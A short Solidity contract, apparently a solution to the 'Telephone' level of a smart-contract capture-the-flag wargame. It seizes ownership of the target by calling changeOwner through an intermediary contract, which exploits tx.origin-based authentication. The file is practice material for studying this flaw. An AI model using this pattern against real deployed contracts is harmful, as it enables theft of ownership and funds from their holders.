// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Telephone } from "./Level04.sol";

contract L04Attack {
    Telephone instance;

    constructor(Telephone _instance) {
        instance = _instance;
    }

    function attack() external {
        instance.changeOwner(msg.sender);
    }
}
